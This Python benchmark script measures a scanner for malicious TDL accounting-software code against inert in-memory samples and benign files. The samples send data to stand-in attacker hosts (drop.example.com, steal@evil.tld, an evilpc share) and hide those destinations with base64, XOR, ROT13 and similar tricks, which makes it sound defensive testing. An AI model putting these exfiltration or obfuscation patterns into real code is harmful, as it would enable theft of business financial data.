#!/usr/bin/env python3
"""
benchmark.py — Measure the scanner's real detection quality.

We can only claim "catches everything known" if we *measure* it. This runs the
scanner over a labeled corpus and reports the honest numbers:

    recall (detection rate) — of the malicious samples, how many did we flag?
    false-positive rate     — of the benign samples, how many did we wrongly flag?
    precision               — of everything we flagged, how much was truly malicious?

The malicious corpus is generated in memory from technique templates (one per
evasion trick / capability / data-flow shape) — so this repo ships no usable
stealer, only the detector and its measurements. The benign corpus is the real
files under tests/corpus/benign/.

Run:
    python benchmark.py            # prints the report
    exit code 0 if recall >= --min-recall and fp-rate <= --max-fp, else 1
"""

from __future__ import annotations

import argparse
import base64
import codecs
import zlib
from pathlib import Path

from tdl_scanner import analyze


FLAGGED_PREFIXES = ("DANGEROUS", "REVIEW REQUIRED", "SUSPICIOUS")
_URL = "http://drop.example.com/x"


def is_flagged(verdict: str) -> bool:
    return verdict.startswith(FLAGGED_PREFIXES)


def _charcode(s: str) -> str:
    return " + ".join(f"$$StrByCharCode:{ord(c)}" for c in s)


def malicious_samples() -> dict[str, str]:
    """One inert sample per known technique — each MUST be flagged."""
    b64 = base64.b64encode(_URL.encode()).decode()
    dbl = base64.b64encode(b64.encode()).decode()
    gz = base64.b64encode(zlib.compress(_URL.encode())).decode()
    xored = bytes(b ^ 0x2A for b in _URL.encode()).hex()

    fn = lambda body: f"[Function : X]\n{body}"       # noqa: E731
    return {
        # --- outbound capabilities ---
        "http-get":        fn(f' 10 : SET : U : $$HttpGet:@@E:"{_URL}"'),
        "http-post":       fn(' 10 : Action : HTTP Post : @@U : "" : "" : @@B'),
        "remote-url":      fn(' 10 : RemoteURL : @@Sync'),
        # Soft channels are only a threat WITH abuse context (hard-coded recipient,
        # or a read→send pairing) — that's what these encode.
        "email-exfil":     fn(' 10 : SendMail : @@Server : "steal@evil.tld" : @@Body'),
        "db-exfil":        ('[Function : X]\n 10 : WALK COLLECTION : Voucher\n'
                            ' 20 : SQLExecute : Insert Into ext_tbl'),
        "share-exfil":     ('[Function : X]\n 10 : SET : D : $$CmpMailingName\n'
                            ' 20 : Set File : "\\\\evilpc\\drop\\d.txt"'),
        # --- code execution ---
        "dll-call":        fn(' 10 : CALL DLL : helper : Run'),
        "launch-exe":      fn(' 10 : EXECUTE : payload'),
        # --- obfuscated destinations ---
        "charcode":        fn(f' 10 : SET : U : {_charcode(_URL)}'),
        "base64":          fn(f' 10 : SET : U : "{b64}"'),
        "double-base64":   fn(f' 10 : SET : U : "{dbl}"'),
        "hex":             fn(f' 10 : SET : U : "{_URL.encode().hex()}"'),
        "xor":             fn(f' 10 : SET : U : "{xored}"'),
        "reverse":         fn(f' 10 : SET : U : "{_URL[::-1]}"'),
        "rot13":           fn(f' 10 : SET : U : "{codecs.encode(_URL, "rot_13")}"'),
        "url-encoding":    fn(' 10 : SET : U : "http%3A%2F%2Fdrop.example.com%2Fx"'),
        "gzip":            fn(f' 10 : SET : U : "{gz}"'),
        "ftp-url":         fn(' 10 : SET : U : "ftp://evil.example.com/x"'),
        "xp-cmdshell":     fn(' 10 : EXEC xp_cmdshell'),
        "hex-spaced":      fn(' 10 : SET : U : "' + " ".join(f"{b:02x}" for b in _URL.encode()) + '"'),
        "reversed-base64": fn(f' 10 : SET : U : "{b64[::-1]}"'),
        "multibyte-xor":   fn(f' 10 : SET : U : "{bytes(b ^ ((i%3)+1) for i, b in enumerate(_URL.encode())).hex()}"'),
        "split-vars":      ('[Function : X]\n 10 : SET : A : "http://drop."\n'
                            ' 20 : SET : B : "example.com/x"\n 30 : SET : U : ##A + ##B'),
        # --- data-flow shapes ---
        "same-block-flow": ('[Function : X]\n 10 : WALK COLLECTION : Ledger\n'
                            ' 20 : SET : O : $$HttpGet:@@U:""'),
        "cross-block-flow": ('[Function : R]\n 10 : SET : S : $$CmpMailingName\n'
                             '[Function : W]\n 10 : SET : O : $$HttpGet:@@U:##S'),
        "interprocedural":  ('[Function : Sender]\n 10 : SET : Z : $$HttpGet:@@U:##A\n'
                             '[Function : Main]\n 10 : SET : D : $$CmpMailingName\n'
                             ' 20 : CALL : Sender : ##D'),
    }


def benign_samples() -> dict[str, str]:
    root = Path(__file__).resolve().parent / "tests" / "corpus" / "benign"
    corpus = {p.name: p.read_text(encoding="utf-8-sig") for p in sorted(root.glob("*.tdl"))}
    # Inline tricky-but-benign cases that must stay quiet (false-alarm guards).
    icon = base64.b64encode(b"\x89PNG\r\n" + b"\x00" * 200).decode()
    inline = {
        "doc-url-in-comment": ';; see http://example.com/docs for help\n[Field:F]\n Set as:"hi"',
        "exe-in-help-string": '[Field:F]\n Set as : "Run setup.exe to install"',
        "embedded-icon":      f'Set : Icon : "{icon}"',
        "localhost-sync":     'SET : U : "http://127.0.0.1:9000/sync"',
        # Legitimate uses of "outbound" capabilities — must stay quiet.
        "email-invoice":      '[Button : E]\n Action : Mail Report : Invoice : @@CustomerEmail',
        "sql-local-lookup":   '[Function : Q]\n 10 : SQLExecute : SELECT Name From LocalTbl',
    }
    return {**corpus, **inline}


def compute_metrics() -> dict:
    mal = malicious_samples()
    ben = benign_samples()

    mal_results = {n: is_flagged(analyze(t).verdict) for n, t in mal.items()}
    ben_results = {n: is_flagged(analyze(t).verdict) for n, t in ben.items()}

    tp = sum(mal_results.values())
    fn = len(mal) - tp
    fp = sum(ben_results.values())
    tn = len(ben) - fp

    recall = tp / len(mal) if mal else 1.0
    fp_rate = fp / len(ben) if ben else 0.0
    precision = tp / (tp + fp) if (tp + fp) else 1.0

    return {
        "tp": tp, "fn": fn, "fp": fp, "tn": tn,
        "recall": recall, "fp_rate": fp_rate, "precision": precision,
        "missed": [n for n, ok in mal_results.items() if not ok],
        "false_alarms": [n for n, ok in ben_results.items() if ok],
        "n_malicious": len(mal), "n_benign": len(ben),
    }


def main() -> int:
    ap = argparse.ArgumentParser(description="Measure scanner detection quality.")
    ap.add_argument("--min-recall", type=float, default=1.0)
    ap.add_argument("--max-fp", type=float, default=0.0)
    args = ap.parse_args()

    m = compute_metrics()
    print("=" * 56)
    print("TDL SCANNER — DETECTION BENCHMARK")
    print("=" * 56)
    print(f"  malicious samples : {m['n_malicious']}")
    print(f"  benign samples    : {m['n_benign']}")
    print("-" * 56)
    print(f"  detected (TP)     : {m['tp']:>3}   missed (FN)      : {m['fn']:>3}")
    print(f"  false alarms (FP) : {m['fp']:>3}   correct-quiet(TN): {m['tn']:>3}")
    print("-" * 56)
    print(f"  recall (catch)    : {m['recall']*100:6.1f}%")
    print(f"  false-positive    : {m['fp_rate']*100:6.1f}%")
    print(f"  precision         : {m['precision']*100:6.1f}%")
    if m["missed"]:
        print(f"  MISSED           : {', '.join(m['missed'])}")
    if m["false_alarms"]:
        print(f"  FALSE ALARMS     : {', '.join(m['false_alarms'])}")
    print("=" * 56)

    ok = m["recall"] >= args.min_recall and m["fp_rate"] <= args.max_fp
    print("RESULT:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
